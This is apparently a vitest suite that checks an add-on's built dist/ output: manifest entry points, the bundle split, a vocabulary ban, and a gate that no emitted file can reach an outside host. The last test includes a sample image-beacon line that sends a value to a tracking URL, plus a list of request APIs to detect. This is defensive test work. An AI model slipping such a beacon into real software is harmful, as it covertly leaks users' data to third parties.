/**
 * The gate over the ARTEFACT rather than over the sources.
 *
 * Two of this wave's rules are claims about files that do not exist until
 * something is built, and both were unfalsifiable until this suite:
 *
 *  1. `manifest.json` names entry points — one `client` path per filled slot,
 *     one `server` path per provided contract. Nothing was checking that the
 *     build emits them. It named `client/artwork-tile.js`, `client/editor-route.js`
 *     and `server/artwork-source.js`, and the build produced `client.js` and
 *     nothing else, so the client/server split those fields describe was a
 *     sentence in a JSON file. Both are now `dist/`-prefixed and resolved
 *     against the PACKAGE ROOT — the directory a host installs — which is the
 *     convention every add-on in this repo uses.
 *
 *  2. The vocabulary ban (17 §2 / 24 D12) is a grep over BUILT output. Checking
 *     the string bundle catches the copy; it does not catch a CSS class name, a
 *     minified identifier or a comment that survived minification. The tables
 *     come from `testing/lexicon.ts`, which `i18n/strings.test.ts` also uses, so
 *     the two halves cannot drift apart.
 *
 * IT DOES NOT ASSUME `dist/` IS FRESH. The build runs in vitest global setup —
 * `src/testing/dist.ts`, wired in `vite.config.ts` — once, before any worker
 * starts, because `manifest.test.ts` reads the same directory and two suites
 * racing to empty and rewrite it is a flake nobody can reproduce.
 */

import { describe, expect, it } from "vitest";

import { foreignImportsIn, offendingAddresses, sendersIn } from "@adminium/add-on-host/testing";

import manifest from "../manifest.json";
import { emittedFiles, readEmitted } from "./testing/dist.ts";
import { ALLOWED_TOKENS, CARVE_OUTS, scanForBannedLexicon } from "./testing/lexicon.ts";

/** Every emitted file, package-root-relative — the alphabet the manifest uses. */
const emitted = emittedFiles();

describe("the manifest's entry points exist in the build output", () => {
  /*
   * The assertion the reviewer's finding turns on. `toContain` on the emitted
   * list rather than `existsSync` on purpose: when it fails it prints what the
   * build DID produce next to what the manifest asked for, which is the whole
   * diagnosis.
   */
  it("emits a file for every slot's client path", () => {
    for (const fill of manifest.addOn.slots) {
      expect(emitted, `slot ${fill.slot} points at a file the build never wrote`).toContain(
        fill.client,
      );
    }
  });

  it("emits a file for every provided contract's server path", () => {
    for (const provided of manifest.addOn.provides) {
      expect(
        emitted,
        `contract ${provided.contract} points at a file the build never wrote`,
      ).toContain(provided.server);
    }
  });

  it("emits nothing the manifest does not account for", () => {
    // `dist/client.css` is the one file the manifest cannot name — the slot
    // schema has no field for a stylesheet, and §5.7 item 2 has the host serve
    // it beside the bundle. Everything else here is declared above, and an
    // unexplained fourth file means the build split something.
    expect(emitted).toEqual(["dist/client.css", "dist/client.js", "dist/server.js"]);
  });

  it("emits no sourcemap, which would carry every source file into dist/", () => {
    // A `.map` is a copy of `src/` in the published artefact: every comment,
    // every translator note, verbatim, in a file the release sweep would then
    // have to grep. `vite.config.ts` sets `sourcemap: false` in BOTH passes;
    // this is the assertion that notices if either one is turned back on.
    expect(emitted.filter((file) => file.endsWith(".map"))).toEqual([]);
  });

  it("keeps the client half a SINGLE ESM bundle (D7)", () => {
    // A THIRD script is what a shared chunk looks like, and it is the exact
    // failure mode that made this a two-pass build: one lib build with two
    // entries hoists the engine into a hash-named extra file, and the host then
    // has to fetch something no manifest field describes.
    const scripts = emitted.filter((file) => file.endsWith(".js"));
    expect(scripts).toEqual(["dist/client.js", "dist/server.js"]);
    expect(emitted.some((file) => /-[A-Za-z0-9_]{8}\.js$/.test(file))).toBe(false);
  });

  it("both slots load the one bundle, because the host serves one", () => {
    expect(manifest.addOn.slots.map((fill) => fill.client)).toEqual([
      "dist/client.js",
      "dist/client.js",
    ]);
  });
});

describe("the client/server split is real in the artefact (AC10)", () => {
  it("keeps React, the JSX runtime and the icon set out of the server half", () => {
    const server = readEmitted("dist/server.js");
    expect(server).not.toMatch(/from\s*["']react/);
    expect(server).not.toMatch(/react\/jsx-runtime/);
    expect(server).not.toMatch(/lucide-react/);
    expect(server).not.toMatch(/jsxDEV|jsxs?\(/);
  });

  it("puts the real engine in the server half rather than an empty re-export", () => {
    const server = readEmitted("dist/server.js");
    // Both halves carry the engine — two rollup passes duplicate rather than
    // share (D7). If this file ever shrinks to a stub, the contract it claims
    // to provide is not in it.
    expect(server.length).toBeGreaterThan(20_000);
    expect(server).toContain("design-studio");
  });

  it("declares no import of anything outside the bundle", () => {
    // The server half has no externals configured, so a bare specifier here
    // would mean a runtime dependency this add-on is not allowed (D7).
    const server = readEmitted("dist/server.js");
    const bare = [...server.matchAll(/\bfrom\s*["']([^."'][^"']*)["']/g)].map((m) => m[1]);
    expect(bare).toEqual([]);
  });
});

describe("the vocabulary ban, over built output (17 §2, 24 D12)", () => {
  // `.map` is in the pattern even though the build emits none: if a sourcemap
  // ever appears it must be greped like anything else, not exempted for being
  // machine-written. The list above asserts none exists; this makes sure that
  // if one did, it would still be read.
  const GREPPED = /\.(js|css|html|map)$/;

  it("greps every emitted script, stylesheet, map and page — no file exempt", () => {
    // Guards the guard, twice over. If the build stops emitting CSS the suite
    // below would pass by having nothing to read; and if it ever emits a file
    // type this pattern does not cover, that file would be silently exempt.
    // Nothing here is skipped because it is awkward to keep clean.
    const scanned = emitted.filter((file) => GREPPED.test(file));
    expect(scanned).toEqual(emitted);
    expect(scanned).toEqual(["dist/client.css", "dist/client.js", "dist/server.js"]);
  });

  it("finds no banned word that a carve-out does not explain", () => {
    const offences = emitted
      .filter((file) => GREPPED.test(file))
      .flatMap((file) => scanForBannedLexicon(file, readEmitted(file)))
      .map((o) => `${o.file} · “${o.hit}” · …${o.context}…`);
    expect(offences).toEqual([]);
  });

  it("keeps the carve-out lists short enough to read, and reasoned", () => {
    // The two lists are the complete set of things this gate forgives, so they
    // are worth a test of their own: every entry carries a sentence saying why,
    // and both stay small enough that a reviewer actually reads them. Growing
    // either is a decision, not a fix.
    expect(CARVE_OUTS.length).toBeLessThanOrEqual(4);
    for (const carve of CARVE_OUTS) expect(carve.why.length).toBeGreaterThan(30);
    expect(ALLOWED_TOKENS.length).toBeLessThanOrEqual(12);
    for (const allow of ALLOWED_TOKENS) expect(allow.why.length).toBeGreaterThan(30);
  });

  it("forgives whole words only, never a banned word glued to punctuation", () => {
    // The shape of the exemption matters as much as its contents. `pro` is
    // carried as a SUBSTRING, exactly as the sweep carries it, and the escape
    // hatch is a named whole word — so a marketing use survives no matter how
    // it is punctuated, spaced or cased.
    for (const bait of ["Pro.", "(pro)", "PRO", "pro-tier", "The Pro one", "proplan"]) {
      expect(scanForBannedLexicon("bait", bait), bait).not.toEqual([]);
    }
    // …while the words the exemptions actually name stay quiet.
    for (const fine of ["proof_required", "productKey", "Propriétés", "stopPropagation"]) {
      expect(scanForBannedLexicon("fine", fine), fine).toEqual([]);
    }
  });
});

/**
 * D11 OVER THE ARTEFACT, WHICH IS WHERE THE MUTANT REACHED.
 *
 * `sources.test.ts` states the rule over the sources; this states it over the
 * bytes a host serves. The two are not the same check: an address can arrive
 * from a dependency, survive minification as a folded constant, or be written
 * in a file the source walk does not classify as shipped. A verifier put an
 * image beacon into a sibling package's component and it reached a live host's
 * bundle with every gate green — the bundle is the last place it can be caught,
 * and this is the gate that reads it.
 *
 * The sender net runs over built output here because this package's `dist/` is
 * ITS OWN CODE. React and every other dependency are external (see the entry
 * assertions above), so a request-issuing API in these bytes was written here.
 */
describe("nothing in the artefact can reach a host we do not control (24 D11)", () => {
  const BYTES = /\.(js|css|html|map)$/;

  it("names no address at all, in any emitted file", () => {
    // The empty allow-list is the assertion: this add-on declares no `network`
    // block, so the FIRST URL to appear in its bundle is a finding, whatever it
    // points at and however it got there.
    const offences = emitted
      .filter((file) => BYTES.test(file))
      .flatMap((file) => offendingAddresses(readEmitted(file), []).map((url) => `${file} → ${url}`));
    expect(offences).toEqual([]);
  });

  it("carries nothing that can issue a request", () => {
    const offences = emitted
      .filter((file) => BYTES.test(file))
      .flatMap((file) => [
        ...sendersIn(readEmitted(file)).map((means) => `${file} → ${means}`),
        ...foreignImportsIn(readEmitted(file)).map((spec) => `${file} → ${spec}`),
      ]);
    expect(offences).toEqual([]);
  });

  it("would report an image beacon, which is the mutant that beat the old grep", () => {
    // Driven over the detector rather than restated beside it: the mutant's own
    // two lines, which contain none of `fetch`, `XMLHttpRequest`, `WebSocket`,
    // `sendBeacon` or `EventSource`, and which both nets catch.
    const mutant = 'const img=new Image();img.src="https://tracking.example-analytics.net/p?c="+c;';
    expect(offendingAddresses(mutant, [])).toEqual(["https://tracking.example-analytics.net/p?c="]);
    expect(sendersIn(mutant)).toEqual(["new Image — an image beacon"]);
  });
});
